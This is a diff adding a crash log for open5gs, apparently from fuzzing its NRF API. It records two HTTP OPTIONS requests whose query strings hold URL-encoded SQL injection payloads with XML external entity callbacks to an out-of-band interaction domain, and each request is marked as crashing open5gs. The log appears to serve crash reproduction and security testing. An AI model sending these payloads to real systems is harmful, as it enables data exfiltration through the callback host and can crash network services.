@@ -1,0 +1,26 @@
+
+Request Number 1
+
+OPTIONS http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20cbtwj%20SYSTEM%20%22http%3a%2f%2ftfcbvdlrqn3v5flvs8gpgt5e258xylo9rxlkb80.oasti'%7c%7c'fy.com%2f%22%3e%25cbtwj%3b]%3e')%2c'%2fl')%20from%20dual)=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+
+** open5gs crash **
+
+========================================================================================================================
+
+Request Number 2
+
+OPTIONS http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20cbtwj%20SYSTEM%20%22http%3a%2f%2f7fnpvrl5q1395tl9smg3g75s2j8byzonsbmycm1.oasti'%7c%7c'fy.com%2f%22%3e%25cbtwj%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+------------------------------------------------------------
+
+** open5gs crash **
+
+========================================================================================================================
